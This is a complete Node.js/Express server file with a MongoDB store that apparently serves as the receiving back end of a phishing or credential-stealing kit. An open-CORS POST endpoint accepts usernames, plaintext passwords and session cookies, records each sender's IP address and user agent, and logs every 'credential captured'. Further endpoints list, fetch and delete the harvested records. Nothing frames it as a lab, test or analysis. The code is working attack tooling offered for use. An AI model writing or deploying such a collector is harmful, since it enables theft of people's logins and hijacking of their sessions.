const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection URI from environment variable
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
    console.error("MONGO_URI is missing");
    process.exit(1);
}

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB Atlas"))
    .catch((err) => {
        console.error("❌ MongoDB connection error:", err.message);
        process.exit(1);
    });

// Define Mongoose Schema and Model
const credentialSchema = new mongoose.Schema({
  username: {
    type: String,
    required: [true, 'Username is required'],
    trim: true
  },
  password: {
    type: String,
    required: [true, 'Password is required']
  },
  cookies: {
    type: String,
    default: ''
  },
  ip_address: {
    type: String,
    default: ''
  },
  user_agent: {
    type: String,
    default: ''
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Create index for faster queries
credentialSchema.index({ timestamp: -1 });

const Credential = mongoose.model('Credential', credentialSchema);

// Endpoint to receive credentials
app.post('/api/credentials', async (req, res) => {
  const { username, password, cookies } = req.body;
  
  // Get IP address and User Agent
  const ipAddress = req.ip || req.connection.remoteAddress || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';

  if (!username || !password) {
    return res.status(400).json({ 
      error: 'Username and password are required' 
    });
  }

  try {
    // Create new credential document
    const newCredential = new Credential({
      username,
      password,
      cookies: cookies || '',
      ip_address: ipAddress,
      user_agent: userAgent
    });

    // Save to MongoDB Atlas
    const savedCredential = await newCredential.save();
    
    console.log(`✅ New credential captured: ${username} from IP: ${ipAddress}`);
    
    res.status(201).json({ 
      message: 'Credentials saved successfully',
      id: savedCredential._id
    });
  } catch (err) {
    console.error('❌ Error saving credentials:', err.message);
    res.status(500).json({ 
      error: 'Failed to save credentials',
      details: err.message 
    });
  }
});

// Get all credentials
app.get('/api/credentials', async (req, res) => {
  try {
    // Fetch all credentials, sorted by newest first
    const credentials = await Credential.find()
      .sort({ timestamp: -1 })
      .lean();
    
    res.json(credentials);
  } catch (err) {
    console.error('❌ Error fetching credentials:', err.message);
    res.status(500).json({ 
      error: 'Failed to fetch credentials',
      details: err.message 
    });
  }
});

// Get single credential by ID
app.get('/api/credentials/:id', async (req, res) => {
  try {
    const credential = await Credential.findById(req.params.id);
    
    if (!credential) {
      return res.status(404).json({ error: 'Credential not found' });
    }
    
    res.json(credential);
  } catch (err) {
    console.error('❌ Error fetching credential:', err.message);
    res.status(500).json({ 
      error: 'Failed to fetch credential',
      details: err.message 
    });
  }
});

// Delete a credential
app.delete('/api/credentials/:id', async (req, res) => {
  try {
    const deletedCredential = await Credential.findByIdAndDelete(req.params.id);
    
    if (!deletedCredential) {
      return res.status(404).json({ error: 'Credential not found' });
    }
    
    console.log(`🗑️ Deleted credential: ${deletedCredential.username}`);
    res.json({ message: 'Credential deleted successfully' });
  } catch (err) {
    console.error('❌ Error deleting credential:', err.message);
    res.status(500).json({ 
      error: 'Failed to delete credential',
      details: err.message 
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});